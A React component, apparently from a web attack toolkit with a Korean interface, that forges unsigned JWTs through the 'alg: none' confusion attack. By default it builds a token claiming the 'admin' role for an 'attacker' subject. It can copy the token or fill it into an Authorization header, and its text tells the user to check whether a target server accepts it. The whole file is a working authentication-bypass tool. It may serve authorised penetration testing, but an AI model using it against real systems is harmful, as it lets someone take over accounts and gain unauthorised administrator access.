import { useState } from "react";
import { buildNoneAlgJwt } from "./jwtForge";

// The classic JWT "alg: none" confusion attack: some servers decode a JWT's
// header, see alg: none, and skip signature verification entirely -- so
// forging a token needs no key material, just base64url(header).
// base64url(payload). with an empty signature segment.
export default function JwtForgePanel({ onUseAsAuthHeader }: {
  onUseAsAuthHeader?: (token: string) => void;
}) {
  const [header, setHeader] = useState('{\n  "alg": "none",\n  "typ": "JWT"\n}');
  const [payload, setPayload] = useState('{\n  "sub": "attacker",\n  "role": "admin"\n}');
  const [error, setError] = useState("");
  const [copied, setCopied] = useState(false);

  let token = "";
  try {
    token = buildNoneAlgJwt(header, payload);
    if (error) setError("");
  } catch (reason) {
    if (!error) setError(reason instanceof Error ? reason.message : String(reason));
  }

  const copy = async () => {
    if (!token) return;
    await navigator.clipboard.writeText(token);
    setCopied(true);
    window.setTimeout(() => setCopied(false), 1500);
  };

  return (
    <div className="sqlPayloadReference" aria-labelledby="jwt-forge-heading">
      <div className="webSectionTitle">
        <span>JWT alg:none 위조</span>
        <h2 id="jwt-forge-heading">서명 없는 토큰 만들기</h2>
        <p>
          일부 JWT 구현은 헤더의 <code>alg</code>가 <code>none</code>이면 서명 검증
          자체를 건너뜁니다 — 키 없이 원하는 클레임(예: <code>role: admin</code>)을
          그대로 넣은 토큰을 만들 수 있습니다. 헤더/페이로드를 수정한 뒤 만들어진
          토큰을 대상 서버가 실제로 받아주는지 확인하세요.
        </p>
      </div>
      <div className="sqlPayloadCategory">
        <div className="sqlPayloadList">
          <div className="sqlPayloadRow">
            <div>
              <b>HEADER · JSON</b>
              <textarea aria-label="JWT 헤더" value={header}
                onChange={(e) => setHeader(e.target.value)} rows={4}
                style={{ width: "100%", fontFamily: "inherit" }} />
            </div>
          </div>
          <div className="sqlPayloadRow">
            <div>
              <b>PAYLOAD · JSON</b>
              <textarea aria-label="JWT 페이로드" value={payload}
                onChange={(e) => setPayload(e.target.value)} rows={4}
                style={{ width: "100%", fontFamily: "inherit" }} />
            </div>
          </div>
          {error && <p className="webError" role="alert">{error}</p>}
          <div className="sqlPayloadRow">
            <div>
              <b>위조된 토큰</b>
              <code style={{ display: "block", wordBreak: "break-all" }}>
                {token || "(헤더/페이로드가 올바른 JSON이어야 합니다)"}
              </code>
            </div>
            <div className="sqlPayloadActions">
              <button disabled={!token} onClick={() => void copy()}>
                {copied ? "복사됨" : "토큰 복사"}
              </button>
              {onUseAsAuthHeader && <button disabled={!token}
                onClick={() => onUseAsAuthHeader(token)}>
                Authorization 헤더로 채우기
              </button>}
            </div>
          </div>
        </div>
      </div>
    </div>
  );
}
